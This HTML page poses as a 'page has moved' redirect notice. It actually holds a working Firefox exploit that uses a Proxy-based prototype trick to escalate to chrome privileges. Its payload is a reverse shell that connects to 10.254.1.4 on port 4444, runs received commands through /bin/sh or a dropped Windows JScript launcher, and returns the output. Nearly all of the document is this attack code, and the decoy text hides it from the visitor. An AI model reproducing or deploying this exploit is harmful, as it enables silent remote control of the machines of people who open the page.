
      <!doctype html>
      <html>
        <body>
          <script>
            
      var opts = {"xSSxxUGXkyoBjAZG":"\n      (function(){\n        window = this;\n\n        Components.utils.import(\"resource://gre/modules/NetUtil.jsm\");\n        var host = '10.254.1.4';\n        var port = 4444;\n\n        var socketTransport = Components.classes[\"@mozilla.org/network/socket-transport-service;1\"]\n                                .getService(Components.interfaces.nsISocketTransportService);\n        var socket = socketTransport.createTransport(null, 0, host, port, null);\n        var outStream = socket.openOutputStream(0, 0, 0);\n        var inStream = socket.openInputStream(0, 0, 0);\n\n        var pump = Components.classes[\"@mozilla.org/network/input-stream-pump;1\"]\n                       .createInstance(Components.interfaces.nsIInputStreamPump);\n        pump.init(inStream, -1, -1, 0, 0, true);\n\n        \n      var readUntilToken = function(cb) {\n        Components.utils.import(\"resource://gre/modules/NetUtil.jsm\");\n\n        var buffer = '', m = null;\n        return function(request, context, stream, offset, count) {\n          buffer += NetUtil.readInputStreamToString(stream, count);\n          if (buffer.match(/^(\\[\\[\\w{8}\\]\\])/)) {\n            if (m = buffer.match(/^(\\[\\[\\w{8}\\]\\])([\\s\\S]*)\\1/)) {\n              cb(m[2]);\n              buffer = '';\n            }\n          } else if (buffer.indexOf(\"\\n\") > -1) {\n            cb(buffer);\n            buffer = '';\n          }\n        };\n      };\n    \n\n        var listener = {\n          onStartRequest: function(request, context) {},\n          onStopRequest: function(request, context) {},\n          onDataAvailable: readUntilToken(function(data) {\n            runCmd(data, function(err, output) {\n              if (!err) outStream.write(output, output.length);\n            });\n          })\n        };\n\n        \n      \n      var readFile = function(path) {\n        try {\n          var file = Components.classes[\"@mozilla.org/file/local;1\"]\n                   .createInstance(Components.interfaces.nsILocalFile);\n          file.initWithPath(path);\n\n          var fileStream = Components.classes[\"@mozilla.org/network/file-input-stream;1\"]\n                           .createInstance(Components.interfaces.nsIFileInputStream);\n          fileStream.init(file, 1, 0, false);\n\n          var binaryStream = Components.classes[\"@mozilla.org/binaryinputstream;1\"]\n                             .createInstance(Components.interfaces.nsIBinaryInputStream);\n          binaryStream.setInputStream(fileStream);\n          var array = binaryStream.readByteArray(fileStream.available());\n\n          binaryStream.close();\n          fileStream.close();\n          file.remove(true);\n\n          return array.map(function(aItem) { return String.fromCharCode(aItem); }).join(\"\");\n        } catch (e) { return \"\"; }\n      };\n    \n      \n      var setTimeout = function(cb, delay) {\n        var timer = Components.classes[\"@mozilla.org/timer;1\"].createInstance(Components.interfaces.nsITimer);\n        timer.initWithCallback({notify:cb}, delay, Components.interfaces.nsITimer.TYPE_ONE_SHOT);\n        return timer;\n      };\n    \n\n      var ua = Components.classes[\"@mozilla.org/network/protocol;1?name=http\"]\n        .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;\n      var windows = (ua.indexOf(\"Windows\")>-1);\n      var svcs = Components.utils.import(\"resource://gre/modules/Services.jsm\");\n      var jscript = ({\"src\":\"\\n      var b64 = WScript.arguments(0);\\n      var dom = new ActiveXObject(\\\"MSXML2.DOMDocument.3.0\\\");\\n      var el  = dom.createElement(\\\"root\\\");\\n      el.dataType = \\\"bin.base64\\\"; el.text = b64; dom.appendChild(el);\\n      var stream = new ActiveXObject(\\\"ADODB.Stream\\\");\\n      stream.Type=1; stream.Open(); stream.Write(el.nodeTypedValue);\\n      stream.Position=0; stream.type=2; stream.CharSet = \\\"us-ascii\\\"; stream.Position=0;\\n      var cmd = stream.ReadText();\\n      (new ActiveXObject(\\\"WScript.Shell\\\")).Run(cmd, 0, true);\\n    \"}).src;\n      var runCmd = function(cmd, cb) {\n        cb = cb || (function(){});\n\n        if (cmd.trim().length == 0) {\n          setTimeout(function(){ cb(\"Command is empty string ('').\"); });\n          return;\n        }\n\n        var js = (/^\\s*\\[JAVASCRIPT\\]([\\s\\S]*)\\[\\/JAVASCRIPT\\]/g).exec(cmd.trim());\n        if (js) {\n          var tag = \"[!JAVASCRIPT]\";\n          var sync = true;  /* avoid zalgo's reach */\n          var sent = false;\n          var retVal = null;\n\n          try {\n            this.send = function(r){\n              if (sent) return;\n              sent = true;\n              if (r) {\n                if (sync) setTimeout(function(){ cb(false, r+tag+\"\\n\"); });\n                else      cb(false, r+tag+\"\\n\");\n              }\n            };\n            retVal = Function(js[1]).call(this);\n          } catch (e) { retVal = e.message; }\n\n          sync = false;\n\n          if (retVal && !sent) {\n            sent = true;\n            setTimeout(function(){ cb(false, retVal+tag+\"\\n\"); });\n          }\n\n          return;\n        }\n\n        var shEsc = \"\\\\$&\";\n        var shPath = \"/bin/sh -c\";\n\n        if (windows) {\n          shPath = \"cmd /c\";\n          shEsc = \"\\^$&\";\n          var jscriptFile = Components.classes[\"@mozilla.org/file/directory_service;1\"]\n            .getService(Components.interfaces.nsIProperties)\n            .get(\"TmpD\", Components.interfaces.nsIFile);\n          jscriptFile.append('bXl4l7ZY8Z5ritZ290.js');\n          var stream = Components.classes[\"@mozilla.org/network/safe-file-output-stream;1\"]\n            .createInstance(Components.interfaces.nsIFileOutputStream);\n          stream.init(jscriptFile, 0x04 | 0x08 | 0x20, 0666, 0);\n          stream.write(jscript, jscript.length);\n          if (stream instanceof Components.interfaces.nsISafeOutputStream) {\n            stream.finish();\n          } else {\n            stream.close();\n          }\n        }\n\n        var stdoutFile = \"kPv18KdRsNVFYyXsJU\";\n\n        var stdout = Components.classes[\"@mozilla.org/file/directory_service;1\"]\n          .getService(Components.interfaces.nsIProperties)\n          .get(\"TmpD\", Components.interfaces.nsIFile);\n        stdout.append(stdoutFile);\n\n        var shell;\n        cmd = cmd.trim();\n        if (windows) {\n          shell = shPath+\" \"+cmd;\n          shell = shPath+\" \"+shell.replace(/\\W/g, shEsc)+\" >\"+stdout.path+\" 2>&1\";\n          var b64 = svcs.btoa(shell);\n        } else {\n          shell = shPath+\" \"+cmd.replace(/\\W/g, shEsc);\n          shell = shPath+\" \"+shell.replace(/\\W/g, shEsc) + \" >\"+stdout.path+\" 2>&1\";\n        }\n\n        var process = Components.classes[\"@mozilla.org/process/util;1\"]\n          .createInstance(Components.interfaces.nsIProcess);\n        var sh = Components.classes[\"@mozilla.org/file/local;1\"]\n                   .createInstance(Components.interfaces.nsILocalFile);\n\n        if (windows) {\n          sh.initWithPath(\"C:\\\\Windows\\\\System32\\\\wscript.exe\");\n          process.init(sh);\n          var args = [jscriptFile.path, b64];\n          process.run(true, args, args.length);\n          jscriptFile.remove(true);\n          setTimeout(function(){cb(false, cmd+\"\\n\"+readFile(stdout.path));});\n        } else {\n          sh.initWithPath(\"/bin/sh\");\n          process.init(sh);\n          var args = [\"-c\", shell];\n          process.run(true, args, args.length);\n          setTimeout(function(){cb(false, readFile(stdout.path));});\n        }\n      };\n    \n\n        pump.asyncRead(listener, null);\n      })();\n\n"};
      var key = opts['xSSxxUGXkyoBjAZG'];
      var props = {};
      props.has = function(n){
        if (!window.top.x && n=='nodeType') {
          window.top.x=window.open("chrome://browser/content/browser.xul", "x",
            "chrome,,top=-9999px,left=-9999px,height=100px,width=100px");
          if (window.top.x) {
            Object.setPrototypeOf(document, pro);
            setTimeout(function(){
              x.location='data:text/html,<iframe mozbrowser src="about:blank"></iframe>';

              setTimeout(function(){
                x.messageManager.loadFrameScript('data:,'+key, false);
                setTimeout(function(){
                  x.close();
                }, 100)
              }, 100)
            }, 100);
          }
        }
      }
      var pro = Object.getPrototypeOf(document);
      Object.setPrototypeOf(document, Proxy.create(props));
    
          </script>
          The page has moved. <span style='text-decoration:underline;'>Click here</span> to be redirected.
        </body>
      </html>
    